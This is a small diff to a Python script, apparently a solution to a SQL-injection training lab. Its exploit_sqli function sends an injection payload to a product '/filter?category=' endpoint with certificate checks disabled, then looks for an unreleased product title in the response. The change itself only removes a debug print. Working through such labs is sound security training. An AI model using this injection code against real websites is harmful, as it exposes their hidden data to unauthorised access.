@@ -2,6 +2,7 @@ import urllib3
 import requests
 import sys
 
+
 # Disable 'Insecure Request' warning
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -16,7 +17,6 @@ def exploit_sqli(url, payload):
     product title in response.
     """
     uri = "/filter?category="
-    print("requesting: ", (url + uri + payload))
     r = requests.get(url + uri + payload, verify=False, proxies=proxies)
 
     if "Umbrella" in r.text: # Unreleased product title
